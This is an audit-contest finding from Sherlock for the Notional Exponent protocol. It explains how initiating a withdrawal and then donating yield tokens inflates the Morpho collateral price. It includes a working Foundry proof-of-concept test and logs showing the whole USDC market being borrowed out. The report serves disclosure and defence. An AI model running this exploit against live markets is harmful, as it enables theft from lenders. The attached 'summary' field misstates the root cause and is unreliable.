{
    "id": 62483,
    "kind": "GIT",
    "auditfirm_id": 3,
    "impact": "HIGH",
    "finders_count": 1,
    "protocol_id": 3104,
    "title": "H-2: Attacker can drain the entire suppliers on Morpho market by inflating collateral price",
    "content": "\nSource: https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/214 \n\n## Found by \nmstpr-brainbot\n\n### Summary\n\nWhen `initiateWithdraw()` is called, the user’s collateral in Morpho (i.e., their shares) is **not burned**, but the underlying LP tokens are used to initiate a withdrawal request. At the same time, the **`effectiveSupply()` is decreased** due to the shares being escrowed.\n\nThis means the user can **donate yield tokens to the strategy** and artificially **inflate the collateral price on Morpho**, while their original deposit remains safely **secured in the withdrawal process** untouched and retrievable.\n\n### Root Cause\n\n[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L280-L307](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L280-L307)\n\nWe can see that when `initiateWithdraw()` is called, the user's assets are registered as a withdrawal request in the `WithdrawRequestManager`, and `s_escrowedShares` is increased.\n\nSince the shares are not burned, `totalSupply()` remains the same before and after the `initiateWithdraw` call. However, because `escrowedShares` increases, the `effectiveSupply()` becomes smaller:\n[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L149-L151](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L149-L151)\n\nIf the user holds a significant amount of shares, they can initiate a withdrawal, drastically reducing the `effectiveSupply()`. While the minimum `effectiveSupply()` is bounded by `VIRTUAL_SHARES` (set to 1e6), this still opens up a vulnerability.\n\nThe next step is to look at how `price()` is calculated in the YieldStrategy (Shares) contract. When users borrow in Morpho, the Morpho oracle (which is the YieldStrategy contract) calls `price()` to determine the value of 1 collateral token in terms of the loan token:\n[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L118-L120](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/AbstractYieldStrategy.sol#L118-L120)\n\nSince `Morpho.borrow()` can be called directly without going through the LendingRouter, the transient variables are not used. Therefore, the overridden `convertToAssets()` method that depends on transient state is skipped, and the base `super.convertToAssets()` is used instead:\n[https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/single-sided-lp/AbstractSingleSidedLP.sol#L300-L303](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/single-sided-lp/AbstractSingleSidedLP.sol#L300-L303)\n\nNow, the critical part is how `convertToAssets()` is calculated:\n\n```solidity\nfunction convertToAssets(uint256 shares) public view virtual override returns (uint256) {\n    uint256 yieldTokens = convertSharesToYieldToken(shares);\n    return (yieldTokens * convertYieldTokenToAsset() * (10 ** _assetDecimals)) /\n        (10 ** (_yieldTokenDecimals + DEFAULT_DECIMALS));\n}\n\nfunction convertSharesToYieldToken(uint256 shares) public view override returns (uint256) {\n    return (shares * (_yieldTokenBalance() - feesAccrued() + VIRTUAL_YIELD_TOKENS)) / effectiveSupply();\n}\n\nfunction convertYieldTokenToShares(uint256 yieldTokens) public view returns (uint256) {\n    return (yieldTokens * effectiveSupply()) / (_yieldTokenBalance() - feesAccrued() + VIRTUAL_YIELD_TOKENS);\n}\n```\n\nIf an attacker donates, say, `1e18` of the yield token to the contract, then the `convertSharesToYieldToken()` for `1e24` shares would compute as:\n\n$$\n\\frac{1e24 \\cdot (1e18 - \\text{fees} + 1e6)}{1e6} \\approx \\text{HUGE value — ~1e36 precision}\n$$\n\nGiven that `convertYieldTokenToAsset()` always returns `1e18` (i.e., DEFAULT\\_PRECISION), the final `convertToAssets()` result becomes:\n\n$$\n1e36 \\cdot 1e18 \\cdot 1e18 / 1e36 = 1e36\n$$\n\nThis is extremely large.\n\nSince Morpho calculates `maxBorrow = collateral * price() * LTV / 1e36`, and:\n\n* the collateral is on the order of `1e24` (e.g., shares)\n* the `price()` returns `1e36`\n\nthe result is:\n\n$$\n\\frac{1e24 \\cdot 1e36}{1e36} = 1e24\n$$\n\nwhich means the user can borrow **up to 1e24 units** of the loan token — essentially **draining the entire USDC market** if the loan token uses 6 decimals.\n\nCrucially, the attacker only loses the `1e18` donation of the yield token — which inflated the `price()` — and they can still finalize their withdrawal request and reclaim their original shares.\n\n\n### Internal Pre-conditions\n\n1. User has significant share of the YieldStrategy such that withdrawing all and donating would increase the rate\n\n### External Pre-conditions\n\nNone needed\n\n### Attack Path\n\n1. initiateWithdraw() on YieldStrategy\n2. donate some yieldToken to YieldStrategy\n3. Borrow the entire YieldStrategy/asset morpho market\n4. Finalize the withdrawal request, get back the collaterals\n\n### Impact\n\nAll supplied funds to morpho market will be lost. \n\n\n### PoC\n\n```solidity\n// forge test --match-test test_Drain_MorphoSuppliers_ByInflationDonation -vv\n    function test_Drain_MorphoSuppliers_ByInflationDonation() public {\n        vm.skip(address(managers[stakeTokenIndex]) == address(0));\n\n        console.log(\"Asset is\", IERC20Metadata(address(asset)).symbol());\n\n        address tapir = address(69);\n        deal(address(asset), tapir, defaultDeposit); \n        _enterPosition(tapir, defaultDeposit, 0);\n        uint256 balanceBefore = lendingRouter.balanceOfCollateral(tapir, address(y));\n\n        console.log(\"Effective supply before initiate withdraw: \", y.effectiveSupply());\n        console.log(\"Price before initiate withdraw: \", y.price());\n\n        MarketParams memory marketParams = MorphoLendingRouter(address(lendingRouter)).marketParams(address(y));\n        Position memory position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);\n        uint maxBorrow = position.collateral * y.price() / 1e36;\n        console.log(\"Max borrow is: \", maxBorrow);\n\n        vm.startPrank(tapir);\n        lendingRouter.initiateWithdraw(tapir, address(y), getWithdrawRequestData(tapir, balanceBefore));\n\n        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);\n        maxBorrow = position.collateral * y.price() / 1e36;\n        console.log(\"Max borrow after initiate withdraw: \", maxBorrow);\n\n        console.log(\"Effective supply after initiate withdraw: \", y.effectiveSupply());\n        console.log(\"Price after initiate withdraw: \", y.price());\n\n        deal(address(y.yieldToken()), tapir, 1e18);\n        console.log(\"Yield token of the vault: \", IERC20Metadata(address(y.yieldToken())).symbol());\n        IERC20(y.yieldToken()).transfer(address(y), 1e18);\n\n        position = MORPHO.position(Id.wrap(keccak256(abi.encode(marketParams))), tapir);\n        maxBorrow = position.collateral * y.price() / 1e36;\n        console.log(\"Max borrow after donation: \", maxBorrow);\n\n        console.log(\"Effective supply after donation: \", y.effectiveSupply());\n        console.log(\"Price after donation: \", y.price());\n\n        Id idx = Id.wrap(keccak256(abi.encode(marketParams)));\n        Market memory market = MORPHO.market(idx);\n        console.log(\"Total supplied\", market.totalSupplyAssets);\n        console.log(\"Total borrowed\", market.totalBorrowAssets);\n\n        uint256 borrowable = market.totalSupplyAssets - market.totalBorrowAssets;\n        console.log(\"Borrowable is\", borrowable);\n\n        MORPHO.borrow(marketParams, borrowable, 0, tapir, tapir);\n        console.log(\"Effective supply after borrow: \", y.effectiveSupply());\n\n        position = MORPHO.position(idx, tapir);\n        console.log(\"collateral\", position.collateral);\n        console.log(\"borrowShares\", position.borrowShares);\n\n        maxBorrow = position.collateral * y.price() / 1e36;\n        uint canBorrow = maxBorrow - position.borrowShares;\n        console.log(\"Can borrow is\", canBorrow); // STILL EXTREMELY HIGH! \n    }\n```\n\nLogs:\nRan 1 test for tests/TestSingleSidedLPStrategyImpl.sol:Test_LP_Curve_sDAI_sUSDe\n[PASS] test_Drain_MorphoSuppliers_ByInflationDonation() (gas: 2739684)\nLogs:\n  Asset is USDC\n  Effective supply before initiate withdraw:  8724580706403393214704000000\n  Price before initiate withdraw:  1145196000000000000\n  Max borrow is:  9991354926\n  Max borrow after initiate withdraw:  9991354926\n  Effective supply after initiate withdraw:  1000000\n  Price after initiate withdraw:  1145196000000000000\n  Yield token of the vault:  MtEthena-gauge\n  Max borrow after donation:  9991362815231220073495623667\n  Effective supply after donation:  1000000\n  Price after donation:  1145196904178796121145196000000000000 // HUGE\n  Total supplied 500000000000\n  Total borrowed 0\n  Borrowable is 500000000000\n  Effective supply after borrow:  1000000\n  collateral 8724580706403393214703000000\n  borrowShares 500000000000000000\n  Can borrow is 9991362814731220073495623667\n\n### Mitigation\n\ntbd\n\n",
    "summary": "\nThis bug report outlines a vulnerability found in the Morpho protocol. When a user calls the `initiateWithdraw()` function, their collateral (shares) is not burned but their LP tokens are used to initiate a withdrawal request. However, their shares are still counted in the `effectiveSupply()` which can be manipulated by donating yield tokens to artificially inflate the collateral price on Morpho. This allows the user to borrow a large amount of loan tokens, potentially draining the entire market. The root cause of this issue is due to a miscalculation in the `convertToAssets()` function. A proof of concept has been provided to demonstrate the impact of this vulnerability. To mitigate this issue, further investigation and changes to the code may be needed.",
    "report_date": "2025-07-18T15:00:00.000Z",
    "contest_prize_txt": "75500 USDC",
    "contest_link": "https://app.sherlock.xyz/audits/contests/1001",
    "sponsor_name": "",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "",
    "github_link": "https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/214",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "1001",
    "slug": "h-2-attacker-can-drain-the-entire-suppliers-on-morpho-market-by-inflating-collateral-price-sherlock-notional-exponent-git",
    "firm_name": "Sherlock",
    "firm_logo_square": "sherlock_square.png",
    "protocol_name": "Notional Exponent",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "mstpr-brainbot"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
    },
    "protocols_protocol": {
        "name": "Notional Exponent",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}